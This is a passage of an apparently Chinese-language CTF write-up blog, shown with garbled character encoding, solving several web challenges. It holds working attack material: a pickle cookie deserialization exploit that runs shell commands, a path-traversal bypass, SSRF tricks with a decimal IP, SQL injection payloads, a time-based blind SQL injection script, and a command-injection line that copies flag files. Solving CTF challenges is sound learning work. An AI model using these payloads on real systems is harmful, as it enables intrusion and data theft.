class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag_&#123;uuid4&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../../secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/download&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    name = request.query.filename</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;../../&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name.startswith(<span class="string">&#x27;/&#x27;</span>) <span class="keyword">or</span> name.startswith(<span class="string">&#x27;../&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">        response.status = <span class="number">403</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Forbidden&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/secret&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_page</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=secret)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=secret)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Forbidden!&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;The secret has been deleted!&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error!&quot;</span></span><br><span class="line">run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå¯ä»¥è¯»å–æ–‡ä»¶ç»•è¿‡æ–¹å¼å¯ä»¥ç”¨<code>./.././../</code> è¯»å–åˆ°secret <code>Hell0_H@cker_Y0u_A3r_Sm@r7</code><br>åœ¨secretè·¯ç”±ä¸‹é¢ç”¨åˆ°äº†get_cookieæ¥é‰´æƒï¼Œè¿™é‡Œçœ‹å®šä¹‰å¯ä»¥å‘ç°ç”¨åˆ°äº†pickle.loads<br><img src="https://pic1.imgdb.cn/item/685d04e958cb8da5c8733857.png"><br>æœ¬åœ°å†™ä¸ªexpç„¶åç”¨bottle.cookie_encodeæ¥å¯¹cookieå€¼è¿›è¡Œç¼–ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">secret = <span class="string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span>(<span class="string">&quot;eval&quot;</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cp /f* /secret.txt&#x27;)&quot;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (bottle.cookie_encode(exp()))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæ˜¯å­¦ä¹ çš„å¤åˆ¶åˆ°&#x2F;secret.txtæ¥é¿å…æƒé™é—®é¢˜<br><img src="https://pic1.imgdb.cn/item/685d093a58cb8da5c87352ac.png"><br>ç„¶åè®¿é—®secret.txtå°±èƒ½æ‹¿åˆ°flag</p>
<h2 id="fate"><a href="#fate" class="headerlink" title="fate"></a>fate</h2><p>è¿™é¢˜ä¸»è¦è€ƒå¯Ÿssrf  jsonååºåˆ—åŒ–æ¼æ´  è¿˜æœ‰ä¸€ç‚¹sqlæ³¨å…¥çš„çŸ¥è¯†<br>app.py</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">blacklist = string.ascii_letters</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">    binary_chunks = [binary_string[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(flask.request.remote_addr)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        code = flask.request.args.get(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;abcdefghi&#x27;</span>:</span><br><span class="line">            req = flask.request.args.get(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = binary_to_string(req)</span><br><span class="line">                <span class="built_in">print</span>(req)</span><br><span class="line">                req = json.loads(req) <span class="comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid JSON&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty Person&#x27;s name&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name = req[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">6</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO &#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO )&quot;</span>)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Some waf hidden here ;)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            fate = db_search(name)</span><br><span class="line">            <span class="keyword">if</span> fate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flask.abort(<span class="number">404</span>, <span class="string">&quot;No such Person&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;Fate&#x27;</span>: fate&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flask.abort(<span class="number">400</span>, <span class="string">&quot;Hello local, and hello hacker&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Only local access allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>init_db.py</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">conn.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE FATETABLE (</span></span><br><span class="line"><span class="string">  NAME TEXT NOT NULL,</span></span><br><span class="line"><span class="string">  FATE TEXT NOT NULL</span></span><br><span class="line"><span class="string">);&quot;&quot;&quot;</span>)</span><br><span class="line">Fate = [</span><br><span class="line">    (<span class="string">&#x27;JOHN&#x27;</span>, <span class="string">&#x27;1994-2030 Dead in a car accident&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;JANE&#x27;</span>, <span class="string">&#x27;1990-2025 Lost in a fire&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;SARAH&#x27;</span>, <span class="string">&#x27;1982-2017 Fired by a government official&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;DANIEL&#x27;</span>, <span class="string">&#x27;1978-2013 Murdered by a police officer&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;LUKE&#x27;</span>, <span class="string">&#x27;1974-2010 Assassinated by a military officer&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;KAREN&#x27;</span>, <span class="string">&#x27;1970-2006 Fallen from a cliff&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;BRIAN&#x27;</span>, <span class="string">&#x27;1966-2002 Drowned in a river&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;ANNA&#x27;</span>, <span class="string">&#x27;1962-1998 Killed by a bomb&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;JACOB&#x27;</span>, <span class="string">&#x27;1954-1990 Lost in a plane crash&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;LAMENTXU&#x27;</span>, <span class="string">r&#x27;2024 Send you a flag flag&#123;FAKE&#125;&#x27;</span>)</span><br><span class="line">]</span><br><span class="line">conn.executemany(<span class="string">&quot;INSERT INTO FATETABLE VALUES (?, ?)&quot;</span>, Fate)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></div>
<p>ä»ç»“æœå‡ºå‘ï¼Œæœ€ç»ˆéœ€è¦è·å–åˆ°çš„å€¼æ˜¯<code>&#39;LAMENTXU&#39;, r&#39;2024 Send you a flag flag&#123;FAKE&#125;&#39;</code> , è¦æƒ³æŸ¥è¯¢åˆ°è¿™ä¸ªæ•°æ®åº“é‡Œçš„å†…å®¹å°±è¦åœ¨è·¯ç”±1337ä¸‹ï¼Œæƒ³è¿›å…¥è¿™ä¸ªè·¯ç”±éœ€è¦æœ¬åœ°è®¿é—®ï¼Œç°åœ¨é¦–è¦çš„ç›®æ ‡å°±æ˜¯å¦‚ä½•ssrf<br>æœ‰ä¸€ä¸ªproxyè·¯ç”±å¯ä»¥è®¾ç½®ä»£ç†ï¼Œä½†æ˜¯è¿‡æ»¤äº†<code>.</code>æ‰€ä»¥ä¸èƒ½ç›´æ¥ä½¿ç”¨127.0.0.1  è€Œè¿™é‡Œé»˜è®¤æ˜¯è·³è½¬åˆ°<code>http://lamentxu.top</code>æˆ‘ä»¬è¿˜è¦ç»•è¿‡è¿™ä¸€é‡é™åˆ¶ã€‚  ä¹‹å‰åšbpå®éªŒå®¤ä¸­ä¹Ÿæœ‰ç›¸å…³çš„ç»•è¿‡æ‰‹æ®µ<a href="https://guayu-kakeru.github.io/posts/37808.html">https://guayu-kakeru.github.io/posts/37808.html</a><br>ç»•è¿‡<code>.</code>å¯ä»¥ä½¿ç”¨ä¸åŒçš„è¿›åˆ¶ æ¯”å¦‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">(127 Ã— 256Â³) <span class="code">+ (0 Ã— 256Â²) +</span> (0 Ã— 256Â¹) + (1 Ã— 256â°)</span><br><span class="line"><span class="section">= 2130706433</span></span><br></pre></td></tr></table></figure></div>
<p>ç»•è¿‡è·³è½¬å¯ä»¥ç”¨<code>@</code> ï¼Œ è¿™ä¸ªä¼šè®©<code>@</code>å‰é¢å½“ä½œæ˜¯è´¦å·<br>è®¿é—®<code>/proxy?url=@2130706433:8080/1337</code> ç«¯å£åœ¨8080<br><img src="https://pic1.imgdb.cn/item/685d13a658cb8da5c873a0b2.png"><br>æˆåŠŸäº†ï¼Œæ‰€ä»¥ç°åœ¨ssrfæˆåŠŸäº†<br>ç„¶åéœ€è¦è®©ä¸€ä¸ªå‚æ•°<code>0</code> &#x3D; <code>abcdefghi</code> è¿™é‡Œçš„é»‘åå•æ˜¯<code>blacklist = string.ascii_letters</code> æ‰€æœ‰çš„å­—æ¯<br>ç»•è¿‡å¯ä»¥ç”¨urlç¼–ç <code>%61%62%63%64%65%66%67%68%69</code><br><code>1</code>è¿™ä¸ªå‚æ•°æ¥æŸ¥è¯¢æ•°æ®åº“<br>ç¬¬ä¸€ä¸ªè§£å†³è½¬æ¢é—®é¢˜<code>req = binary_to_string(req)</code> è®©aiå†™ä¸€ä¸ªstring_to_binaryå‡½æ•°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_binary</span>(<span class="params">input_string</span>):</span><br><span class="line">    binary_chunks = []</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> input_string:</span><br><span class="line">        ascii_value = <span class="built_in">ord</span>(char)</span><br><span class="line">        binary_chunk = <span class="built_in">bin</span>(ascii_value).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment">#ç¡®ä¿æ¯ä¸ªäºŒè¿›åˆ¶å—éƒ½æ˜¯8ä½é•¿ï¼Œä¸è¶³çš„åœ¨å‰é¢è¡¥0</span></span><br><span class="line">        padded_binary_chunk = binary_chunk.zfill(<span class="number">8</span>)</span><br><span class="line">        binary_chunks.append(padded_binary_chunk)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(binary_chunks)</span><br><span class="line"></span><br><span class="line">malicious_payload = <span class="string">&#x27;&#123;&quot;name&quot;:&quot;john&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">data_to_send = string_to_binary(malicious_payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;åŸå§‹æ¶æ„å­—ç¬¦ä¸²: <span class="subst">&#123;malicious_payload&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;éœ€è¦å‘é€çš„äºŒè¿›åˆ¶è¡¨ç¤º: <span class="subst">&#123;data_to_send&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/685d172258cb8da5c873ca0b.png"><br>ç°åœ¨å°±æ˜¯ç”¨johnè¿™ä¸ªç¬¬ä¸€æ¡äººååšå®éªŒï¼Œå‘ç°å¯ä»¥äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è¦è¯»å–çš„äººåå¤ªé•¿äº†è¶…è¿‡6ä¸ªå­—ç¬¦ï¼Œä¸ç¬¦åˆè¦æ±‚<br>ç»•è¿‡æ–¹å¼æ˜¯ç”¨json æ ¼å¼ï¼Œ è¿™é‡Œå–çš„æ˜¯nameçš„é•¿åº¦ï¼Œæˆ‘ä»¬è®©nameçš„å€¼åˆæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¿™æ ·å­nameçš„é•¿åº¦å°±åªæœ‰1äº†<br>ç„¶åå†ç”¨ä¸€ä¸ªç®€å•çš„sqlæ³¨å…¥å°±å¯ä»¥äº†<br><code>malicious_payload = &#39;&#123;&quot;name&quot;: &#123;&quot;))))))) or 1=1 limit 1 offset 9-- +&quot;:&quot;1&quot;&#125;&#125;&#39;</code><br>ç”¨ä¸Šé¢çš„è½¬æ¢è„šæœ¬ç”ŸæˆäºŒè¿›åˆ¶æ•°</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">0111101100100010011011100110000101101101011001010010001000111010001000000111101100100010001010010010100100101001001010010010100100101001001010010010000001101111011100100010000000110001001111010011000100100000011011000110100101101101011010010111010000100000001100010010000001101111011001100110011001110011011001010111010000100000001110010010110100101101001000000010101100100010001110100010001000110001001000100111110101111101</span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°flag<br>æ„Ÿè§‰å®¹æ˜“å¡ä½çš„ç‚¹æ˜¯ç»•è¿‡nameçš„é•¿åº¦é™åˆ¶ï¼Œssrfè¿˜æ˜¯æŒºå¸¸è§„çš„</p>
<p><img src="https://pic1.imgdb.cn/item/685d18fb58cb8da5c873da8d.png"></p>
<h2 id="ezpuzzle"><a href="#ezpuzzle" class="headerlink" title="ezpuzzle"></a>ezpuzzle</h2><p>è€ƒå¯Ÿå‰æ®µçš„jsè°ƒè¯•<br><img src="https://pic1.imgdb.cn/item/685d1f2358cb8da5c873e67b.png"><br>å½“ç„¶æ˜¯ä¸èƒ½æ‰‹åŠ¨è°ƒè¯•çš„<br><img src="https://pic1.imgdb.cn/item/685d1fe358cb8da5c873ea1b.png"><br>ä¸èƒ½é€šè¿‡å¿«æ·é”®æ‰“å¼€è°ƒè¯•å°±ç”¨æ‰‹åŠ¨æ‰“å¼€<br>ç„¶åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªpuzzle.jsæ–‡ä»¶ï¼Œè‡ªå·±çœ‹å¯èƒ½æœ‰ç‚¹å¤šï¼Œå¯ä»¥æ‰”ç»™aiæœ‰ä¸‹é¢å‡ ç§æ€è·¯<br>1 ç›´æ¥ä¿®æ”¹åˆ¤æ–­æ˜¯å¦èƒœåˆ©çš„è¿”å›å€¼<br><img src="https://pic1.imgdb.cn/item/685d249058cb8da5c873f4d8.png"><br>è¿™ä¸ªå‡½æ•°è¿”å›F3KH_(h, O)<br><img src="https://pic1.imgdb.cn/item/685d24e658cb8da5c873f4e4.png"><br>æŠŠè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ”¹æˆ0x1<br>ç¬¬äºŒç§æ˜¯æŠŠstartTtimeæ”¹æˆç‰¹åˆ«å¤§</p>
<p>æœ€åä¸€ç§æ˜¯éé¢„æœŸè§£<br>ç›´æ¥è®¿é—®è¿™ä¸ªjsä»£ç çš„åœ°æ–¹ å‰é¢æœ‰ä¸€å¯¹base64<br><img src="https://pic1.imgdb.cn/item/685d2edf58cb8da5c873f7ef.png"><br>è§£å¯†åæ˜¯zlibæ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/685d2f1858cb8da5c873f7f9.png"><br>åœ¨cyberchefä¸­å…ˆç”¨from base64 ç„¶åç”¨zlib Inflateå¾—åˆ°ä¸€é•¿ä¸²çš„json<br><img src="https://pic1.imgdb.cn/item/685d303158cb8da5c873f82a.png"><br>è¿™é‡Œå°±æ˜¯flag åè½¬ä¸€ä¸‹ç„¶åfrom hex</p>
<h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>å…ˆfuzzä¸€ä¸‹waf<br><img src="https://pic1.imgdb.cn/item/685f87cb58cb8da5c87a29f1.png"><br>å‘ç°usernameè¿™é‡Œè¿‡æ»¤äº†å¾ˆå¤š ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤or ç©ºæ ¼å¯ä»¥ç”¨<code>/t</code>(tabé”®)ç»•è¿‡<br><code>username=1 or  1=1#&amp;password=1</code>ç™»é™†è¿›æ¥<br><img src="https://pic1.imgdb.cn/item/685f8ce058cb8da5c87a36b9.png"><br>è¿™é‡Œå°±æ˜¯è¦æˆ‘ä»¬è·å–åˆ°è¿™ä¸ªkeyçš„å€¼ï¼Œ<br>æ¥ä¸‹æ¥å†™ä¸€ä¸ªæ—¶é—´ç›²æ³¨çš„è„šæœ¬æ¥è·å–è¡¨å</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://gz.imxbt.cn:20668/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    low,high = <span class="number">32</span>,<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high :</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema = database()&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;1&#x27;or\t1=&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="string">f&quot;or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)) &gt; <span class="subst">&#123;mid&#125;</span>,sleep(1),1)#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        times = time.time()</span><br><span class="line">        r = requests.post(url = url ,data = data)</span><br><span class="line">        <span class="keyword">if</span>(time.time() - times &gt;= <span class="number">1</span>):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>double_check å¾—åˆ°è¿™ä¸ªè¡¨ååæƒ³ç»§ç»­å¾—åˆ°åˆ—åï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›<br>åœ¨ç™»é™†ç•Œé¢ä¸­å¯†ç ä¸­è¾“å…¥å•åŒå¼•å·ä¹‹åï¼Œå‘ç°æ²¡æœ‰æŠ¥è¯­æ³•é”™è¯¯ï¼Œè¯´æ˜è¢«è½¬ä¹‰äº†ï¼Œ<br>é‚£ç°åœ¨å°±ä¸éœ€è¦åˆ—åï¼Œç”¨æ— åˆ—åæ³¨å…¥</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">payload = &quot;<span class="keyword">select</span> x <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> x <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> double_check <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)a<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°key <code>dtfrtkcc0czkoua9S</code><br>ç”¨ä¸‡èƒ½å¯†ç ç™»é™†åï¼Œç”¨è¿™ä¸ªkeyå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾<br><img src="https://pic1.imgdb.cn/item/685fc61558cb8da5c87b1a8e.png"><br>è€Œä¸”å°è¯•ä¹‹åå‘ç°è¿‡æ»¤äº†ç©ºæ ¼<br>ç”¨cat  å†™å…¥æ–‡ä»¶ <code>cat$&#123;IFS&#125;/f*&gt;/var/www/html/a.txt</code></p>
<h2 id="Now-you-see-me-1"><a href="#Now-you-see-me-1" class="headerlink" title="Now you see me 1"></a>Now you see me 1</h2><p>è¿™é¢˜å¯ä»¥è¯´ç»™åªçŸ¥é“sstiå…¥é—¨çš„æˆ‘å¸¦æ¥äº†å¼ºå¤§çš„å†²å‡»ï¼ŒåŸæ¥sstiæœ‰è¿™ä¹ˆèŠ±å¼æ‰‹æ®µ<br>æ‹¿åˆ°é™„ä»¶åï¼Œæœ‰å¾ˆé•¿ä¸€æ®µbase64ï¼Œè§£ç ä¹‹åå°±æ˜¯æºä»£ç </p>
